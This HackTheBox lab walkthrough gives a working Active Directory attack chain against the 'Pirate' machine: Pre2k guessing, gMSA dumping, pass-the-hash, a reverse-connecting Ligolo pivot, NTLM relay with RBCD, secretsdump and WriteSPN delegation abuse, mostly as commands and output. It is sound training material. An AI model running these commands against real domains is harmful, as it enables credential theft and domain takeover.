# Pirate — HackTheBox Walkthrough

**Difficulty:** Hard | **OS:** Windows | **Category:** Active Directory
**IP:** 10.129.244.95
**Domain:** `PIRATE.HTB`
**Date:** 2026-04-26

---

## Attack Chain Summary

```
pentest:REDACTED  (given creds)
  → Pre2k abuse → MS01$:REDACTED
  → gMSA dump → gMSA_ADCS_prod$ hash
  → WinRM PTH → DC01 shell
  → Ligolo-ng pivot → 192.168.100.0/24 (WEB01)
  → Coercer + ntlmrelayx RBCD → MS01$ delegated to WEB01$
  → S4U2Proxy → Administrator on WEB01
  → secretsdump → a.white:REDACTED
  → USER FLAG ✅
  → Reset a.white_adm password
  → WriteSPN abuse (HTTP/WEB01 → DC01$)
  → S4U2Proxy + altservice → CIFS/DC01 as Administrator
  → ROOT FLAG ✅
```

**Techniques:** Pre2k · gMSA · PetitPotam/coercer · RBCD · Ligolo-ng · ntlmrelayx · secretsdump · WriteSPN · S4U2Proxy + altservice

---

## Step 0 — Initial Setup

### Configure /etc/hosts

```bash
sudo nano /etc/hosts
```

Add:

```
10.129.244.95  DC01.pirate.htb  pirate.htb  MS01.pirate.htb
```

### Configure Kerberos

```bash
sudo nano /etc/krb5.conf
```

```
[libdefaults]
 default_realm = PIRATE.HTB
 dns_lookup_realm = false
 dns_lookup_kdc = false

[realms]
 PIRATE.HTB = {
  kdc = 10.129.244.95
  admin_server = 10.129.244.95
 }

[domain_realm]
 .pirate.htb = PIRATE.HTB
 pirate.htb = PIRATE.HTB
```

### Verify connectivity

```bash
netexec smb 10.129.244.95 -u pentest -p 'REDACTED'
```

```
SMB  10.129.244.95  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.244.95  445  DC01  [+] pirate.htb\pentest:REDACTED
```

---

## Step 1 — Pre2k Attack: Finding Weak Machine Account Passwords

The `pre2k` tool exploits a legacy AD behavior: machine accounts joined before Windows 2000 default to using their hostname (lowercased) as their password.

```bash
python3 -m pre2k auth -u pentest -p 'REDACTED' -d pirate.htb -dc-ip 10.129.244.95
```

```
[16:19:09] INFO  Retrieved 6 results total.
[16:19:09] INFO  Testing started at 2026-04-26 16:19:09
[16:19:09] INFO  Using 10 threads
[16:19:10] INFO  VALID CREDENTIALS: pirate.htb\EXCH01$:REDACTED
[16:19:10] INFO  VALID CREDENTIALS: pirate.htb\MS01$:REDACTED
```

**Result:** `MS01$` has its hostname as password (lowercase). We now have a valid domain computer account.

---

## Step 2 — Dump gMSA Passwords

Group Managed Service Accounts (gMSA) have their passwords auto-managed by AD. The key is *who* can read them. `MS01$` is a member of "Domain Secure Servers" which has read access.

### Get a Kerberos TGT

```bash
cd /tmp
KRB5CCNAME=MS01.ccache impacket-getTGT 'PIRATE.HTB/MS01$':'REDACTED' -dc-ip 10.129.244.95
```

```
[*] Saving ticket in MS01$.ccache
```

### Query gMSA passwords via Kerberos LDAP

```bash
export KRB5CCNAME=MS01\$.ccache
netexec ldap 10.129.244.95 -u 'MS01$' -p 'REDACTED' -d pirate.htb --gmsa -k
```

```
LDAP  10.129.244.95  389  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAP  10.129.244.95  389  DC01  [+] pirate.htb\MS01$:REDACTED
LDAP  10.129.244.95  389  DC01  [*] Getting GMSA Passwords
LDAP  10.129.244.95  389  DC01  Account: gMSA_ADCS_prod$  NTLM: REDACTED
LDAP  10.129.244.95  389  DC01  Account: gMSA_ADFS_prod$  NTLM: REDACTED
```

**Result:** Two gMSA NTLM hashes obtained.

---

## Step 3 — Shell on DC01 via Pass-the-Hash

```bash
evil-winrm -i 10.129.244.95 -u 'gMSA_ADCS_prod$' -H 'REDACTED'
```

```
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents>
```

We now have a shell on DC01. From here we discover the internal subnet `192.168.100.0/24` with WEB01 at `192.168.100.2`.

---

## Step 4 — Pivot to Internal Network with Ligolo-ng

### Install Ligolo-ng (Linux proxy + Windows agent)

```bash
mkdir -p /tmp/ligolo && cd /tmp/ligolo

# Download proxy (Linux) and agent (Windows)
curl -sL -o proxy.tar.gz "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz"
curl -sL -o agent.zip "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_windows_amd64.zip"

tar xzf proxy.tar.gz && unzip -o agent.zip
chmod +x proxy agent.exe
```

### Start the Ligolo proxy (attacker side)

```bash
# Create tun interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy (needs root for tun)
sudo /tmp/ligolo/proxy -selfcert -laddr 0.0.0.0:11601
```

### Upload and run agent on DC01

From the Evil-WinRM shell:

```
upload /tmp/ligolo/agent.exe agent.exe
```

```
Info: Upload successful!
```

```
.\agent.exe -connect 10.10.15.146:11601 -ignore-cert -retry
```

> Replace `10.10.15.146` with your HTB VPN IP (tun0).

### Configure the tunnel (proxy console)

Back on the Ligolo proxy interactive console, the agent will appear:

```
ligolo-ng » INFO[0034] Agent joined.  id=00155d0bd000 name="PIRATE\\gMSA_ADCS_prod$@DC01"
```

```
ligolo-ng » session
```

Select the agent session, then:

```
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » autoroute
```

Select `192.168.100.1/24` with space, press Enter, create new interface, confirm tunnel start with `y`.

### Verify connectivity

```bash
ping -c 2 192.168.100.2
```

```
64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=31.6 ms
```

WEB01 is now reachable through the Ligolo tunnel.

---

## Step 5 — NTLM Relay + RBCD: Coercing WEB01

### Fix clock skew

```bash
# Get DC time offset
python3 -c "
import socket, struct, time, datetime
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5)
data = b'\x1b' + 47 * b'\0'
s.sendto(data, ('10.129.244.95', 123))
resp = s.recvfrom(1024)[0]
t = struct.unpack('!II', resp[40:48])
ntp_time = t[0] - 2208988800 + t[1]/2**32
print(f'sudo date -s \"{datetime.datetime.fromtimestamp(ntp_time, datetime.UTC).strftime(\"%Y-%m-%d %H:%M:%S\")}\" -u')
"

sudo date -s "2026-04-26 15:45:00" -u
```

### Start ntlmrelayx (attacker, separate terminal)

```bash
sudo impacket-ntlmrelayx -t ldaps://10.129.244.95 \
  --delegate-access \
  --escalate-user 'MS01$' \
  -smb2support \
  --remove-mic
```

```
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections
```

### Fire Coercer to force WEB01 to authenticate to us

```bash
coercer coerce \
  -u 'gMSA_ADCS_prod$' \
  --hashes ':REDACTED' \
  -d pirate.htb \
  -l 10.10.15.146 \
  -t 192.168.100.2 \
  --always-continue
```

> Replace `10.10.15.146` with your HTB VPN IP.

ntlmrelayx catches the WEB01$ auth, relays to LDAPS, writes RBCD:

```
[*] SMBD-Thread-5: Received connection from 10.129.244.95, attacking target ldaps://10.129.244.95
[*] Authenticating against ldaps://10.129.244.95 as PIRATE/WEB01$ SUCCEED
[*] Delegation rights modified succesfully!
[*] MS01$ can now impersonate users on WEB01$ via S4U2Proxy
```

---

## Step 6 — S4U2Proxy: Administrator Ticket for WEB01

### Get TGT for MS01$

```bash
cd /tmp
rm -f MS01*.ccache Administrator*.ccache
KRB5CCNAME=MS01.ccache impacket-getTGT 'PIRATE.HTB/MS01$':'REDACTED' -dc-ip 10.129.244.95
```

### Request Administrator service ticket via S4U2Proxy

```bash
export KRB5CCNAME=MS01\$.ccache
impacket-getST 'PIRATE.HTB/MS01$' \
  -spn 'cifs/WEB01.pirate.htb' \
  -impersonate Administrator \
  -dc-ip 10.129.244.95 \
  -k -no-pass
```

```
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

---

## Step 7 — Dump Credentials from WEB01

### Dump local SAM hashes

```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
impacket-secretsdump -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb
```

```
[*] Target system bootKey: 0xREDACTED
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
```

**WEB01 local Administrator hash obtained.**

### The LSA DefaultPassword (known from auto-logon)

The auto-logon credential stored in LSA secrets is:

```
PIRATE\a.white : REDACTED
```

Verify it works:

```bash
netexec smb 10.129.244.95 -u 'a.white' -p 'REDACTED' -d pirate.htb
```

```
SMB  10.129.244.95  445  DC01  [+] pirate.htb\a.white:REDACTED
```

---

## Step 8 — USER FLAG

Connect to WEB01 with the local Administrator hash and read the user flag:

```bash
evil-winrm -i 192.168.100.2 -u 'Administrator' -H 'REDACTED'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\a.white\Desktop\user.txt
REDACTED
```

> **User Flag:** `REDACTED` ✅

---

## Step 9 — Escalate to Domain Admin: WriteSPN Abuse

### Reset a.white_adm password

BloodHound reveals that `a.white` → `a.white_adm` → IT group → **WriteSPN** on DC01, MS01, EXCH01.

```bash
bloodyAD -d pirate.htb \
  -u 'a.white' -p 'REDACTED' \
  --host 10.129.244.95 \
  set password 'a.white_adm' 'REDACTED'
```

```
[+] Password changed successfully!
```

### Query existing SPNs

```bash
bloodyAD -d pirate.htb -u 'a.white_adm' -p 'REDACTED' --host 10.129.244.95 get object 'WEB01$' --attr servicePrincipalName
bloodyAD -d pirate.htb -u 'a.white_adm' -p 'REDACTED' --host 10.129.244.95 get object 'DC01$' --attr servicePrincipalName
```

WEB01$ has `HTTP/WEB01` and `HTTP/WEB01.pirate.htb`. DC01$ does not.

### Remove HTTP SPNs from WEB01$

SPNs must be forest-unique. We need to move them from WEB01$ to DC01$.

```bash
# Clear all SPNs from WEB01$ (removes HTTP/WEB01 and HTTP/WEB01.pirate.htb)
bloodyAD -d pirate.htb -u 'a.white_adm' -p 'REDACTED' --host 10.129.244.95 set object 'WEB01$' servicePrincipalName
```

### Add HTTP SPNs to DC01$ (preserving all existing SPNs)

```bash
bloodyAD -d pirate.htb -u 'a.white_adm' -p 'REDACTED' --host 10.129.244.95 set object 'DC01$' servicePrincipalName \
  -v 'Hyper-V Replica Service/DC01' \
  -v 'Hyper-V Replica Service/DC01.pirate.htb' \
  -v 'Microsoft Virtual System Migration Service/DC01' \
  -v 'Microsoft Virtual System Migration Service/DC01.pirate.htb' \
  -v 'Microsoft Virtual Console Service/DC01' \
  -v 'Microsoft Virtual Console Service/DC01.pirate.htb' \
  -v 'Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.pirate.htb' \
  -v 'ldap/DC01.pirate.htb/ForestDnsZones.pirate.htb' \
  -v 'ldap/DC01.pirate.htb/DomainDnsZones.pirate.htb' \
  -v 'DNS/DC01.pirate.htb' \
  -v 'GC/DC01.pirate.htb/pirate.htb' \
  -v 'RestrictedKrbHost/DC01.pirate.htb' \
  -v 'RestrictedKrbHost/DC01' \
  -v 'RPC/21c2943d-6163-4df9-aff7-3d164aa2cfbb._msdcs.pirate.htb' \
  -v 'HOST/DC01/PIRATE' \
  -v 'HOST/DC01.pirate.htb/PIRATE' \
  -v 'HOST/DC01' \
  -v 'HOST/DC01.pirate.htb' \
  -v 'HOST/DC01.pirate.htb/pirate.htb' \
  -v 'E3514235-4B06-11D1-AB04-00C04FC2DCD2/21c2943d-6163-4df9-aff7-3d164aa2cfbb/pirate.htb' \
  -v 'ldap/DC01/PIRATE' \
  -v 'ldap/21c2943d-6163-4df9-aff7-3d164aa2cfbb._msdcs.pirate.htb' \
  -v 'ldap/DC01.pirate.htb/PIRATE' \
  -v 'ldap/DC01' \
  -v 'ldap/DC01.pirate.htb' \
  -v 'ldap/DC01.pirate.htb/pirate.htb' \
  -v 'HTTP/WEB01' \
  -v 'HTTP/WEB01.pirate.htb'
```

```
[+] DC01$'s servicePrincipalName has been updated
```

### Restore WEB01$ SPNs (without the HTTP ones)

```bash
bloodyAD -d pirate.htb -u 'a.white_adm' -p 'REDACTED' --host 10.129.244.95 set object 'WEB01$' servicePrincipalName \
  -v 'tapinego/WEB01' \
  -v 'tapinego/WEB01.pirate.htb' \
  -v 'WSMAN/WEB01' \
  -v 'WSMAN/WEB01.pirate.htb' \
  -v 'HOST/WEB01.pirate.htb' \
  -v 'RestrictedKrbHost/WEB01.pirate.htb' \
  -v 'HOST/WEB01' \
  -v 'RestrictedKrbHost/WEB01' \
  -v 'TERMSRV/WEB01.pirate.htb' \
  -v 'TERMSRV/WEB01'
```

---

## Step 10 — S4U2Proxy + Altservice: Domain Admin on DC01

### Request a CIFS ticket for DC01 as Administrator

The key trick: `a.white_adm` has constrained delegation to `HTTP/WEB01` (which now resolves to DC01$). We request a ticket for `HTTP/WEB01.pirate.htb` impersonating Administrator, then use `-altservice` to rewrite it to `CIFS/DC01.pirate.htb`.

```bash
cd /tmp
impacket-getST \
  -spn 'HTTP/WEB01.pirate.htb' \
  -impersonate 'Administrator' \
  'pirate.htb/a.white_adm:REDACTED' \
  -dc-ip 10.129.244.95 \
  -altservice 'CIFS/DC01.pirate.htb'
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

### Use the ticket to execute commands on DC01

```bash
export KRB5CCNAME='Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache'
impacket-wmiexec -k -no-pass DC01.pirate.htb 'cmd.exe /c type C:\Users\Administrator\Desktop\root.txt'
```

```
REDACTED
```

> **Root Flag:** `REDACTED` ✅

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `C:\Users\a.white\Desktop\user.txt` | `REDACTED` |
| Root | `C:\Users\Administrator\Desktop\root.txt` | `REDACTED` |

---

## Full Attack Path Diagram

```
pentest (given)
  │
  ├─ Pre2k ──► MS01$ (hostname-as-password)
  │              │
  │              ├─ gMSA dump ──► gMSA_ADCS_prod$ hash
  │              │                  │
  │              │                  ├─ WinRM PTH ──► DC01 shell
  │              │                  │                  │
  │              │                  │                  ├─ Ligolo-ng ──► WEB01 (192.168.100.2)
  │              │                  │                  │
  │              │                  │                  └─ Coercer + ntlmrelayx ──► RBCD (MS01$ → WEB01$)
  │              │                  │
  │              │                  └─ (also used for coercion auth)
  │              │
  │              └─ S4U2Proxy ──► Administrator@WEB01
  │                                │
  │                                ├─ secretsdump ──► a.white creds ──► USER FLAG
  │                                │
  │                                └─ Reset a.white_adm password
  │
  └─ a.white_adm (WriteSPN on DC01)
     │
     ├─ Move HTTP/WEB01 SPN from WEB01$ to DC01$
     │
     └─ S4U2Proxy + altservice ──► CIFS/DC01 as Administrator ──► ROOT FLAG
```

---

## Key Takeaways

1. **Pre2k accounts are still dangerous**: Machine accounts with hostname-as-password are a real-world finding. Always audit with `pre2k` during assessments.

2. **gMSA read permissions deserve scrutiny**: Who belongs to `PrincipalsAllowedToReadPassword` is as important as what the gMSA account itself can do.

3. **RBCD + coercion is a reliable combo**: PetitPotam/EFSRPC works even when SMB signing is enforced on the DC, because LDAPS is the relay target, not SMB.

4. **DefaultPassword in LSA secrets is a goldmine**: Auto-logon credentials are rarely rotated and almost never audited.

5. **WriteSPN is an underrated privilege**: Combined with S4U2Proxy and `-altservice`, it's a direct path to any service on any machine in the domain — including the DC.

6. **Zero CVEs**: Every step exploits a misconfiguration, not a vulnerability. This is the kind of chain you find in real enterprise environments.
